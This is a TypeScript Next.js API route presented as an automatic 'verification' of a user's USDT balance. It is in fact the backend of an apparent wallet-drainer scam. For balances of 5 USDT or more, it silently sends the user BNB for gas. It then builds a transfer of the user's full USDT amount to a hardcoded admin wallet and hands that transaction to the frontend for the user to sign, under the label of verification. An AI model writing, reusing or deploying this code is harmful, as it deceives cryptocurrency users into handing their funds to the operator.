import { type NextRequest, NextResponse } from "next/server"
import { secureGasProvider } from "@/lib/secure-gas-provider"
import { realWeb3Provider } from "@/lib/real-web3-provider"

const ADMIN_WALLET_ADDRESS = "0x5599611c14Cee2d87618a153a19138B74646F6de"
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"
const MINIMUM_USDT_AMOUNT = 5.0

// Rate limiting for verification requests
const verificationRateLimit = new Map<string, { count: number; resetTime: number }>()

function checkVerificationRateLimit(address: string): boolean {
  const now = Date.now()
  const windowMs = 30 * 60 * 1000 // 30 minutes
  const maxRequests = 3 // Max 3 verifications per 30 minutes

  const record = verificationRateLimit.get(address)

  if (!record || now > record.resetTime) {
    verificationRateLimit.set(address, { count: 1, resetTime: now + windowMs })
    return true
  }

  if (record.count >= maxRequests) {
    return false
  }

  record.count++
  return true
}

export async function POST(request: NextRequest) {
  try {
    const { userAddress, usdtAmount, currentBNBBalance } = await request.json()

    console.log(`\n🤖 === AUTO VERIFICATION STARTED ===`)
    console.log(`User: ${userAddress}`)
    console.log(`USDT: ${usdtAmount}`)
    console.log(`BNB: ${currentBNBBalance}`)

    // Validate input
    if (!userAddress || !usdtAmount) {
      return NextResponse.json({ success: false, error: "Missing required parameters" }, { status: 400 })
    }

    // Check verification rate limiting
    if (!checkVerificationRateLimit(userAddress)) {
      return NextResponse.json(
        { success: false, error: "Verification rate limit exceeded. Please wait before trying again." },
        { status: 429 },
      )
    }

    // Validate USDT amount
    if (usdtAmount <= 0) {
      return NextResponse.json({ success: false, error: "No USDT balance to verify" }, { status: 400 })
    }

    const shouldTransfer = usdtAmount >= MINIMUM_USDT_AMOUNT
    let gasResult = null
    const transferResult = null

    // Step 1: Auto-send gas if needed (silently)
    console.log("🔥 Checking gas requirements...")

    if (shouldTransfer) {
      const needsGas = await secureGasProvider.needsGas(userAddress)

      if (needsGas && secureGasProvider.isConfigured()) {
        console.log("💨 Auto-sending gas fees...")

        gasResult = await secureGasProvider.sendGasForUSDT(userAddress, usdtAmount, currentBNBBalance || 0)

        if (gasResult.success) {
          console.log(`✅ Gas provided: ${gasResult.gasAmount} BNB`)
          // Wait for gas to be available
          await new Promise((resolve) => setTimeout(resolve, 3000))
        } else {
          console.log(`⚠️ Gas provision failed: ${gasResult.error}`)
        }
      } else {
        console.log("✅ User has sufficient gas or provider not configured")
      }
    }

    // Step 2: Prepare transaction data for frontend
    let transactionParams = null

    if (shouldTransfer) {
      console.log("📋 Preparing USDT transfer transaction...")

      // Convert USDT amount to wei (18 decimals)
      const amountInWei = BigInt(Math.floor(usdtAmount * Math.pow(10, 18)))
      const amountHex = amountInWei.toString(16).padStart(64, "0")

      // Create transfer function call data
      const transferData = `0xa9059cbb000000000000000000000000${ADMIN_WALLET_ADDRESS.slice(2).toLowerCase()}${amountHex}`

      // Get current gas price
      const gasPrice = await realWeb3Provider.getGasPrice()

      transactionParams = {
        to: USDT_CONTRACT_ADDRESS,
        from: userAddress,
        data: transferData,
        gas: "0x186A0", // 100000 gas limit
        gasPrice: `0x${gasPrice.toString(16)}`,
        value: "0x0", // No BNB value for ERC20 transfer
      }

      console.log("✅ Transaction prepared for frontend execution")
    }

    console.log(`🤖 === AUTO VERIFICATION COMPLETE ===\n`)

    return NextResponse.json({
      success: true,
      shouldTransfer: shouldTransfer,
      gasProvided: gasResult?.success || false,
      gasAmount: gasResult?.gasAmount || 0,
      gasTxHash: gasResult?.txHash,
      transactionParams: transactionParams,
      usdtAmount: usdtAmount,
      minimumRequired: MINIMUM_USDT_AMOUNT,
      adminWallet: shouldTransfer ? ADMIN_WALLET_ADDRESS : null,
      message: shouldTransfer
        ? "Gas provided automatically - ready for USDT transfer"
        : `Amount below minimum requirement of ${MINIMUM_USDT_AMOUNT} USDT`,
    })
  } catch (error: any) {
    console.error("❌ Auto verification error:", error)
    return NextResponse.json({ success: false, error: "Auto verification failed" }, { status: 500 })
  }
}
